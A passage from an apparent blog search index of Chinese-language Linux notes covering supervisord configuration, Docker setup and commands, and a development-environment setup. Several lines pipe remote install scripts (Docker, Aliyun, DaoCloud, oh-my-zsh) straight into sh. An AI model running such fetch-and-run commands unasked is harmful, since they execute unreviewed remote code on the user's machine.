failures when starting (default 3);autorestart=unexpected ; autorestart if exited after running (def: unexpected);exitcodes=0,2 ; &apos;expected&apos; exit codes used with autorestart (default 0,2);stopsignal=QUIT ; signal used to kill process (default TERM);stopwaitsecs=10 ; max num secs to wait b4 SIGKILL (default 10);stopasgroup=false ; send stop signal to the UNIX process group (default false);killasgroup=false ; SIGKILL the UNIX process group (def false);user=chrism ; setuid to this UNIX account to run the program;redirect_stderr=false ; redirect_stderr=true is not allowed for eventlisteners;stdout_logfile=/a/path ; stdout log path, NONE for none; default AUTO;stdout_logfile_maxbytes=1MB ; max # logfile bytes b4 rotation (default 50MB);stdout_logfile_backups=10 ; # of stdout logfile backups (default 10);stdout_events_enabled=false ; emit events on stdout writes (default false);stderr_logfile=/a/path ; stderr log path, NONE for none; default AUTO;stderr_logfile_maxbytes=1MB ; max # logfile bytes b4 rotation (default 50MB);stderr_logfile_backups=10 ; # of stderr logfile backups (default 10);stderr_events_enabled=false ; emit events on stderr writes (default false);environment=A=&quot;1&quot;,B=&quot;2&quot; ; process environment additions;serverurl=AUTO ; override serverurl computation (childutils); The below sample group section shows all possible group values,; create one or more &apos;real&apos; group: sections to create &quot;heterogeneous&quot;; process groups.;[group:thegroupname];programs=progname1,progname2 ; each refers to &apos;x&apos; in [program:x] definitions;priority=999 ; the relative start priority (default 999); The [include] section can just contain the &quot;files&quot; setting. This; setting can list multiple files (separated by whitespace or; newlines). It can also contain wildcards. The filenames are; interpreted as relative to this file. Included files *cannot*; include files themselves.[include]files = /etc/supervisord.d/*.ini 创建目录 sudo su - root -c “mkdir -p /etc/supervisord.d”以后supervisord.d 就存放进程的管理脚本 123456789[program:somejob]command=/usr/bin/python /Users/tp/code/phone/phone_web/spider/yumi/run_spider_yumi.py 3directroy=/Users/tp/code/phone/phone/phone_web/spider/yumiautostart=trueautorestart=truestartretries=3user=tpstdout_logfile=/Users/tp/temp/super/%(program_name)s.logstderr_logfile=/Users/tp/temp/super/%(program_name)s.log 启动supervisor1sudo supervisor -c /etc/supervisord.conf supervisord 重载12supervisorctl rereadsupervisorctl update 查看supervisor进程1sudo supervisorctl 进程重载1sudo supervisorctl reload somejob 关闭进程1sudo supervisorctl stop somejob","tags":[{"name":"Linux","slug":"Linux","permalink":"http://yoursite.com/tags/Linux/"}]},{"title":"Docker 笔记","date":"2015-03-18T07:16:01.000Z","path":"virtualization/Docker笔记/","text":"安装Docker Docker官方脚本1curl -sSL https://get.docker.com/ | sh 阿里云脚本 1curl -sSL http://acs-public-mirror.oss-cn-hangzhou.aliyuncs.com/docker-engine/internet | sh - DaoCloud脚本 1curl -sSL https://get.daocloud.io/docker | sh 常用操作退出正在运行的容器 不是终止 1先ctrl+p再ctrl+q 检查Docker服务是否运行1ps aux | grep docker 查找镜像 以kali为例1docker search kali 删除所有没有运行的容器1234567➜ ~ docker rm $(docker ps -a | grep Exited | awk &apos;&#123;print $1&#125;&apos;)bcb7eddb6e6fc9175726acaf115104b12746934a087667bd8b20759d9e60d484e3abffa1 修改镜像名字 before 1daocloud.io/library/ubuntu xenial-20160809 f8d79ba03c00 13 days ago 126.4 MB 改名1➜ ~ docker tag daocloud.io/library/ubuntu:xenial-20160809 ubuntu:latest 可以看到除了REPOSITORY和TAG 其他的都一样12daocloud.io/library/ubuntu xenial-20160809 f8d79ba03c00 13 days ago 126.4 MBubuntu latest f8d79ba03c00 13 days ago 126.4 MB 然后删除之前的别名 123➜ ~ docker rmi daocloud.io/library/ubuntu:xenial-20160809Untagged: daocloud.io/library/ubuntu:xenial-20160809Untagged: daocloud.io/library/ubuntu@sha256:746fa32ad3473c57c6a80b9addc1629937778b074b885dcdd9f3366250605850 设置docker开机启动 如果没设置docker服务开机启动的话，先运行命令chkconfig –add docker1在运行docker run的时候再加上命令 --restart=always 修改容器配置 对于已经在运行的容器，可通过如下命令进入容器中进行配置1docker exec -it $container_id /bin/bash 修改源1234567新版的 Docker 使用 /etc/docker/daemon.json（Linux） 或者 %programdata%\\docker\\config\\daemon.json（Windows） 来配置 Daemon。请在该配置文件中加入（没有该文件的话，请先建一个）：&#123; &quot;registry-mirrors&quot;: [&quot;https://docker.mirrors.ustc.edu.cn&quot;]&#125;","tags":[{"name":"Docker","slug":"Docker","permalink":"http://yoursite.com/tags/Docker/"},{"name":"虚拟化","slug":"虚拟化","permalink":"http://yoursite.com/tags/虚拟化/"}]},{"title":"开发环境","date":"2014-11-20T10:30:30.000Z","path":"others/开发环境/","text":"pyuthon git 1sudo pacman -S ipython2 git python2-pip curl zsh python2-matplotlib ctags pip 1sudo pip2 install flask torndb mysql-python flask-sqlalchemy flask-login flask-wtf mysql 123pacman -S mariadb libmariadbclient mariadb-clientssudo systemctl start mysqldsudo systemctl enable mysqld zsh 12apt-get install zsh -ysh -c \"$(curl -fsSL https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh)\" 可自动补齐输入和语法高亮的MySQL的开源命令行接口 12sudo pip2 install mycli#http://mycli.net/ vim 123456789mv ~/.vim ~/.vim.origmv ~/.vimrc ~/.vimrc.origgit clone https://github.com/san-na/dot-vimrc.git ~/.vimln -s ~/.vim/vimrc ~/.vimrcgit clone https://github.com/gmarik/vundle.git ~/.vim/bundle/vundle:BundleInstall ssh 1ssh-keygen -t rsa -b 4096 -C \"email\" Git 1234git config --global user.name 'san-na'git config --global user.email \"mail\"git config --global color.ui=truegit config --global core.editor vim","tags":[]}]